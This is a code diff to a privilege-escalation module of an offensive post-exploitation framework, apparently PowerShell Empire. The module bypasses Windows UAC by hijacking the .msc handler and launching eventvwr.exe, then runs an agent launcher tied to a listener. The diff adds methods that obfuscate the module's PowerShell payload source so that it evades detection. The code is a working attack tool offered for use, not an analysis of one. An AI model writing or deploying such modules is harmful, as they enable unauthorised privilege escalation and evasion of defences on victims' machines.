@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -11,17 +12,17 @@ class Module:
 
             'Description': ("Bypasses UAC by performing an image hijack on the .msc file extension and starting eventvwr.exe. "
                             "No files are dropped to disk, making this opsec safe."),
-        
+
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/',
             ]
@@ -55,9 +56,9 @@ class Module:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-            } 
+            }
         }
-        
+
         # save off a copy of the mainMenu object to access external functionality
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
@@ -69,7 +70,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listenerName = self.options['Listener']['Value']
 
@@ -80,7 +81,10 @@ class Module:
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
-
+        if obfuscate:
+            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Invoke-EventVwrBypass.ps1"
+            if not self.is_obfuscated():
+                self.obfuscate(obfuscationCommand=obfuscationCommand)
         try:
             f = open(moduleSource, 'r')
         except:
@@ -106,3 +110,33 @@ class Module:
             else:
                 script += "Invoke-EventVwrBypass -Command \"%s\"" % (launcher)
                 return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        if self.is_obfuscated() and not forceReobfuscation:
+            return
+
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
+        try:
+            f = open(moduleSource, 'r')
+        except:
+            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            return ""
+
+        moduleCode = f.read()
+        f.close()
+
+        # obfuscate and write to obfuscated source path
+        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Invoke-EventVwrBypass.ps1"
+        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+        try:
+            f = open(obfuscatedSource, 'w')
+        except:
+            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
+            return ""
+        f.write(obfuscatedCode)
+        f.close()
+
+    def is_obfuscated(self):
+        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/privesc/Invoke-EventVwrBypass.ps1"
+        return os.path.isfile(obfuscatedSource)
